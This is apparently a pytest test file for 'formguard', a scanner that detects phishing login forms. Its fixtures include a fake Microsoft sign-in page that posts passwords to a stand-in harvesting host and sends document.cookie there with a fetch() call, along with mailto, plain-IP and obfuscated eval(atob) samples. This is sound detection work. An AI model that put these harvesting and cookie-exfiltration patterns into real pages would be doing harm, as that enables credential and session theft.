"""Tests for formguard. Run: python3 -m pytest -q  (offline, nothing is rendered)"""

import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import formguard as fg  # noqa: E402


def codes(findings):
    return {f["code"] for f in findings}


def analyse_html(html, page_url="", brands=()):
    return fg.analyse(fg.parse_page(html), page_url, brands)


PHISH = """
<html><head><title>Sign in to your Microsoft Outlook account</title>
<meta name="robots" content="noindex">
</head><body>
<form method="post" action="https://collect.example.net/harvest.php">
  <input type="email" name="login">
  <input type="password" name="passwd">
  <input type="hidden" name="victim" value="a@example.com">
  <input type="hidden" name="campaign" value="q4">
</form>
<script>fetch('https://collect.example.net/log?d=' + document.cookie);</script>
</body></html>
"""


def test_external_post_and_brand_mismatch(tmp_path):
    path = tmp_path / "office.html"
    path.write_text(PHISH, encoding="utf-8")
    page = fg.scan_file(str(path), "https://office-login.example/")
    found = codes(page["findings"])
    assert "FG-EXTERNAL-ACTION" in found
    assert "FG-BRAND-MISMATCH" in found
    assert "FG-EXFIL-JS" in found
    assert "FG-HIDDEN-FIELDS" in found
    assert "microsoft" in page["brands"] or "outlook" in page["brands"]


def test_brand_on_its_own_domain_is_not_flagged():
    html = ('<html><head><title>Microsoft account sign in</title></head><body>'
            '<form method="post" action="/auth"><input type="email" name="login">'
            '<input type="password" name="passwd"></form></body></html>')
    found, host, _brands = analyse_html(html, "https://login.live.com/")
    assert host == "live.com"
    assert "FG-BRAND-MISMATCH" not in codes(found)


def test_mailto_action_is_critical():
    html = ('<form action="mailto:steal@example.com" method="post">'
            '<input type="email" name="u"><input type="password" name="p"></form>')
    found, _h, _b = analyse_html(html, "https://a.example/")
    assert "FG-MAILTO-ACTION" in codes(found)
    assert any(f["severity"] == "critical" for f in found)


def test_plaintext_and_ip_actions():
    html = ('<form action="http://192.0.2.9/collect" method="post">'
            '<input type="email" name="u"><input type="password" name="p"></form>')
    found, _h, _b = analyse_html(html, "https://a.example/")
    assert {"FG-PLAINTEXT-ACTION", "FG-IP-ACTION"} <= codes(found)


def test_free_host_action():
    html = ('<form action="https://drop.netlify.app/collect" method="post">'
            '<input type="email" name="u"><input type="password" name="p"></form>')
    found, _h, _b = analyse_html(html, "https://a.example/")
    assert "FG-FREEHOST-ACTION" in codes(found)


def test_get_method_with_password():
    html = ('<form action="/login" method="get">'
            '<input type="email" name="u"><input type="password" name="p"></form>')
    found, _h, _b = analyse_html(html, "https://a.example/")
    assert "FG-GET-CREDENTIALS" in codes(found)


def test_missing_action_means_runtime_destination():
    html = '<form><input type="password" name="p"></form>'
    found, _h, _b = analyse_html(html, "https://a.example/")
    assert "FG-NO-ACTION" in codes(found)
    assert "FG-NO-USERNAME-FIELD" in codes(found)


def test_obfuscation_and_anti_analysis():
    html = ("<html><body oncontextmenu='return false'><script>"
            "eval(atob('ZG9jdW1lbnQ=')); var k='devtools';</script></body></html>")
    found, _h, _b = analyse_html(html, "https://a.example/")
    assert "FG-OBFUSCATION" in codes(found)
    assert "FG-ANTI-ANALYSIS" in codes(found)


def test_kit_fingerprint_and_plaintext_page():
    html = "<html><body>powered by greatness kit</body></html>"
    found, _h, _b = analyse_html(html, "http://a.example/")
    assert "FG-KIT-FINGERPRINT" in codes(found)
    assert "FG-PLAINTEXT-PAGE" in codes(found)


def test_extra_brand_argument():
    html = "<html><body>Welcome to Initech portal</body></html>"
    found, _h, _b = analyse_html(html, "https://initech-login.example/", ["initech"])
    assert "FG-BRAND-MISMATCH" in codes(found)


def test_clean_login_page_has_no_high_findings(tmp_path):
    html = ('<html><head><title>Sign in</title></head><body>'
            '<form method="post" action="/session">'
            '<input type="email" name="email"><input type="password" name="password">'
            '</form></body></html>')
    path = tmp_path / "clean.html"
    path.write_text(html, encoding="utf-8")
    page = fg.scan_file(str(path), "https://app.example.com/")
    assert page["forms"] == 1
    assert page["password_fields"] == 1
    assert not [f for f in page["findings"] if f["severity"] in ("critical", "high")]
    assert fg.main([str(path), "--page-url", "https://app.example.com/"]) == 0


def test_cli_json_and_gate(tmp_path, capsys):
    path = tmp_path / "office.html"
    path.write_text(PHISH, encoding="utf-8")
    assert fg.main([str(path), "--page-url", "https://office-login.example/", "--json"]) == 1
    payload = json.loads(capsys.readouterr().out)
    assert payload["summary"]["gate"] == "FAIL"
    assert payload["summary"]["risk"] > 50
    assert payload["pages"][0]["password_fields"] == 1


def test_scan_errors(tmp_path):
    assert fg.main(["/nope/missing.html"]) == 2
    empty = tmp_path / "empty.html"
    empty.write_text("   ", encoding="utf-8")
    assert fg.main([str(empty)]) == 2


def test_multiple_pages_and_fail_on_none(tmp_path, capsys):
    a = tmp_path / "a.html"
    a.write_text(PHISH, encoding="utf-8")
    b = tmp_path / "b.html"
    b.write_text("<html><body>hello</body></html>", encoding="utf-8")
    assert fg.main([str(a), str(b), "--page-url", "https://x.example/", "--json"]) == 1
    payload = json.loads(capsys.readouterr().out)
    assert payload["summary"]["pages"] == 2
    assert fg.main([str(a), "--fail-on", "none"]) == 0


def test_no_password_page_is_informational():
    found, _h, _b = analyse_html("<html><body>nothing here</body></html>", "https://a.example/")
    assert "FG-NO-CREDENTIAL-INPUT" in codes(found)
    assert all(f["severity"] == "info" for f in found)
